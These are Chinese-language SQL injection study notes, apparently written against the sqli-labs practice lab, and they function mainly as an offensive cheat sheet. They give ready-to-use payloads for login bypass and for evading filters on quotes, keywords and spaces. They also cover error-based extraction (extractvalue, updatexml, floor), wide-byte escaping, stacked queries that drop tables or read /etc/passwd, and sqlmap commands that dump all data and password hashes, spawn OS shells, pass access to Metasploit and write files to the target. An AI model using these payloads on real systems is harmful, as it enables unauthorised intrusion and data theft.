# Sql注入笔记

### 注入检测

| 测试字符串   | 变种           |
| ------------ | -------------- |
| '            |                |
| 1' or '1'='1 | 1') or ('1'='1 |
| 1'           | 1')            |
| 1"           | 1")            |

把引号都测一遍，都没报错再加上括号试试，

然后再考虑引号被转义了，用宽字节注入试试。

 

#### 登陆界面

丁真：我测你们码，



下面为测试字符串。

```
1 OR 1 = 1#
a' OR 1 = 1#
a') OR 1 = 1#
a')) OR 1 = 1#
a" OR 1 = 1#
a") OR 1 = 1#
a")) OR 1 = 1#
```



### mysql基础

#### 常用函数

- version()   数据库版本

- user()   数据库拥有者

- database()  数据库

- system_user()：系统用户名

- session_user()：连接数据库的用户名

- current_user：当前用户名

- load_file()：读取本地文件

- @@datadir：读取数据库路径

- @@basedir：mysql安装路径

- @@version_complie_os：查看操作系统

  ```mysql
  ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL
  length(str) : 返回给定字符串的长度
  substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度
  substr()、stbstring()、mid() 三个函数的用法、功能均一致
  concat(username)：将查询到的username连在一起，默认用逗号分隔
  concat(str1,’*‘,str2)：将字符串str1和str2的数据查询到一起，中间用*连接
  concat_ws('-',username,password)  把数据用-连接起来，此函数常用于group_ws内，用于union注入
  group_concat(username) ：将username数据查询在一起，用逗号连接
  ```

  

#### information_schema

##### information_schema.schemata

包含的是所有数据库名称

| ...  | schema_name                                                 | ...  | ...  |
| ---- | ----------------------------------------------------------- | ---- | ---- |
| ...  | mysql<br/>information_schema<br/>performance_schema<br/>sys | ...  | ...  |



##### information_schema.**tables**

包含的是 所有数据表的名称

| table_schema | ...  | table_name | ...  |
| ------------ | ---- | ---------- | ---- |
| ...          | ...  | ...        | ...  |



##### information_schema.**columns**

包含的是所有列的列名

| column_name | table_schema | ...  |
| ----------- | ------------ | ---- |
|             |              | ...  |

```mysql
//得到第一个数据库库名
select schema_name from information_schema.schemata limit 0,1;
//得到第一个数据表名
select table_name from information_schema.tables limit 0,1;
//得到security数据库的所有表名
select table_name from information_schema.tables where table_schema='security';


//得到第一个列名
select column_name from information_schema.columns limit 0,1;
//得到数据库security中的数据表users的所有列名
select column_name from information_schema.columns where table_schema='security' and table_name='user';
或者
select column_name from security.users limit 0,1;
```



### 绕过技巧

#### 各数据库注释语法


| 数据库                       | 注释                                                   | 描述                                     |
| ---------------------------- | ------------------------------------------------------ | ---------------------------------------- |
| SQL server,oracle,PostgreSQL | --                                                     | 单行注释                                 |
|                              | /*  */                                                 | 多行注释                                 |
| Mysql                        | --[space]    注意这里有空格，所以一般该注释方法写成--+ | 单行注释(后面要有空格或者制表符、换行符) |
|                              | #                                                      | 单行注释                                 |
|                              | /*  */                                                 | 多行注释                                 |







#### 编码

##### url编码

| '     | %27       |
| ----- | --------- |
| "     | %22       |
| 空格  | %20       |
| #     | %23       |
| (   ) | %28   %29 |
| %     | %25       |
| \     | %5c       |

##### Hex编码

| ~    | 0x7e |
| ---- | ---- |
|      |      |
|      |      |
|      |      |



#### 注释符 # --被过滤

分析源代码，闭合引号。



#### and or被过滤

1.双写法

```mysql
oorr
aandnd
Anandd
.
.
.
```

2.利用符号形式

```mysql
and &&
or ||
```

3.改变编码

```mysql
and
or
&&的url编码%26%26
```

4.添加注释

```mysql
union/**/select/**/
```

5.大小写变形

```mysql
AnD Or 。。。
```



#### 空格被过滤

1.转换

windows可能会有问题

| %09       | tab平行   |
| --------- | --------- |
| %0a       | 新建一行  |
| %0c       | 新的一页  |
| %0d       | return    |
| %0b       | tab垂直   |
| ***%a0*** | space空格 |

2.注释绕过

3.括号绕过

把有值的语句括起来



### 小技巧

#### 回显列方法

```mysql
order by 1      order by 4    	看是否报错
select 1,2,3  					看是否报错 或者 回显哪几列
```

#### 转换编码





### 

### 报错注入

#### floor报错注入

```mysql
select count(*),floor(rand(0)*2)x  from security.user group by 
select count(*),concat(database(),floor(rand(0)*2))x from security.users group by x
select * from security.users where id=1 and (selectcount(*),concat(database(),floor(rand(0)*2)x) from security.users group by x)
..


```



详细看https://blog.csdn.net/zpy1998zpy/article/details/80650540

#### extractvalue报错注入

```mysql
extractvalue(xml_document,xpath_string)
```

模板

```mysql
?id=1' and extractvalue(1,concat(0x7e,(select user()),0x7e))#
把select user()做替换即可
```





#### updataxml报错注入

(该注入可以忽略空格，可以考虑用于空格符被过滤的情况)

UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码

```mysql
UPDATEXML(XML_document, XPath_string, new_value)
```

模板

```mysql
?id=1' and updatexml(1,concat(0x7e,user(),0x7e),1)
把user()做替换
```





### HTTP头部注入

#### HTTP头部详解

```
HTTP头部详解

1、 Accept：告诉WEB服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。

2、 Accept-Charset： 浏览器申明自己接收的字符集

Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）

Accept-Language：：浏览器申明自己接收的语言

语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。

3、 Accept-Ranges：WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。

4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。

5、 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器。

6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB服务器去取）

max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）

max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）

min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）

响应：public(可以用 Cached 内容回应任何用户)

private（只能用缓存内容回应先前请求该内容的那个用户）

no-cache（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）

max-age：（本响应包含的对象的过期时间）

ALL: no-store（不允许缓存）

7、 Connection：请求：close（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。

keepalive（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。

响应：close（连接已经关闭）。

keepalive（连接保持着，在等待本次连接的后续请求）。

Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300

8、 Content-Encoding：WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip

9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。

10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012

11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022

12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml

13、 ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。

14、 Expired：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT

15、 Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn

16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。

17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。

18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT

19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。

20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。

21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT

22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如：Location：http://i0.sinaimg.cn /dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif

23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache

24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。

25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546-

26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：http://www.sina.com/

27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)

28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14

29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked

30、 Vary: WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding

31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)

```

#### 方法

1.找注入点

2.burp或其他工具抓包



### 宽字节注入





#### 原理

mysql在使用GBK编码的时候，会认为两个字符是一个汉字，前提是前一个字符的 ASCII 值大于128，才会认为是汉字。而在UTF-8编码中，三个字符为一个汉字。

```
在说之前，我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。

addslashes() ：这个函数在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 ” 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。这个函数的功能和魔术引号完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用 get_magic_quotes_gpc() 来检测是否已经转义。

mysql_real_escape_string() ：这个函数用来转义sql语句中的特殊符号x00 、\n 、\r 、\ 、‘ 、“ 、x1a。

魔术引号：当打开时，所有的单引号’ 、双引号” 、反斜杠\ 和 NULL 字符都会被自动加上一个反斜线来进行转义，这个和 addslashes() 函数的作用完全相同。所以，如果魔术引号打开了，就不要使用 addslashes() 函数了。一共有三个魔术引号指令。

magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。如果 magic_quotes_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0 起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。

magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。

magic_quotes_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。
```



```
'会被转义为\'
```

我们要想绕过这个转义，就得把 ‘ 的 \ 给去掉。那么怎么去掉呢。

\1. 在转义之后，想办法让\前面再加一个\，或者偶数个\即可，这样就变成了\’ ，\ 被转义了，而 ‘ 逃出了限制。

2.在转义之后，想办法把 \ 弄没有，只留下一个 ' 。

#### 注入检测

```
一般，单双引号 括号都无报错，应该就是被过滤了。
或者报错如下  大致就是多了一个\
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' LIMIT 0,1' at line 1
```



#### 绕过方法

```
宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码是%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸，报出MySQL数据库的错误。

```



### 堆叠注入

基础操作，就是使用分号执行多条命令。

#### 基础知识(mysql)

```
新建一个表				select * from users;create table A like users;
删除刚才创建的表		  select * from users;drop table test;
查询数据				 select * from users;select B,C,D;
加载文件				 select * from users;select load_file('/etc/passwd');
增加一条数据			    select *  from users;insert into users values(18,2,3,);
```



### Sqlmap基本使用

```
sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
sqlmap -u "http://www.xx.com/username/admin*"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
有时候使用 --passwords 不能获取到密码，则可以试下
-D mysql -T user -C host,user,password --dump  当MySQL< 5.7时
-D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        #爆出所有的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     #爆出所有的数据表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql 
其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有方式，当然，我们也可以直接手工指定。
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

sqlmap -d "mysql://root:root@192.168.10.130:3306/mysql" --os-shell   #知道网站的账号密码直接连接

-v3                   #输出详细度  最大值5 会显示请求包和回复包
--threads 5           #指定线程数
--fresh-queries       #清除缓存
--flush-session       #清空会话，重构注入 
--batch               #对所有的交互式的都是默认的
--random-agent        #任意的http头
--tamper base64encode            #对提交的数据进行base64编码
--referer http://www.baidu.com   #伪造referer字段

--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数
```

